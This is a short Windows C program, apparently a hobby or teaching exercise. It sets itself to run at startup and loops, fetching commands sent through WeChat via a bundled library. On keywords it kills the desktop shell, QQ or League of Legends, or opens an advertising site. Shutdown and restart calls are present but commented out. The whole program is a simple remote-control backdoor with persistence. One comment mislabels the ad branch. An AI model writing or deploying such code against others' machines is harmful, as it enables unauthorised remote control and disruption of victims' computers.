#include<stdio.h>
#include<windows.h>	//Sleep函数声明在这里面
#include "itmojun.h"

#pragma comment(lib, "itmojun.lib")//引入当前工程目录下的 itmojun.lib 库文件

int main() 
{
	char cmd[301];//存放从微信端接收的消息

	AutoRun(); //将当前程序设置为开机自动运行

	while(1) 
	{
			GetPCCmd("d1h78923", cmd);//从微信端接收一条消息，如果没有任何消息，它会一直等待
			//第一个参数为电脑id，不同电脑建议使用不同的id
			//第二个参数为接收消息的数组

			printf("%s\n",cmd);

			if (strstr(cmd, "关机")) //strstr：在一个字符串中查找子字符串，如果找到则返回其指针，否则返回null
			{
				//WinExec("shutdown -s -t 0", 0);//关机
			} 
			else if (strstr(cmd, "重启")) 
			{
				//WinExec("shutdown -r -t 0", 0);//重启
			}
			else if (strstr(cmd, "桌面")) 
			{
				static int kill_flag = 1;

				if(kill_flag)
					WinExec("taskkill /f /im explorer.exe", 0);//干掉桌面
				else
					WinExec("c:\\windows\\explorer.exe", 1);//恢复桌面
				kill_flag = !kill_flag;
			}
			else if (strstr(cmd, "杀企鹅")) 
			{
				WinExec("taskkill /f /im qq.exe", 0);//强制结束QQ
			}
			else if (strstr(cmd, "亚索")) 
			{
				WinExec("taskkill /f /im client.exe", 0);//强制结束英雄联盟
			}
			else if (strstr(cmd, "广告")) 
			{
				WinExec("explorer https://itmojun.com", 1);//强制结束英雄联盟
			}
			

			Sleep(3000);//延时3秒，避免接收到重复的消息，因为消息会在服务器上暂存3秒
	}

	return 0;
}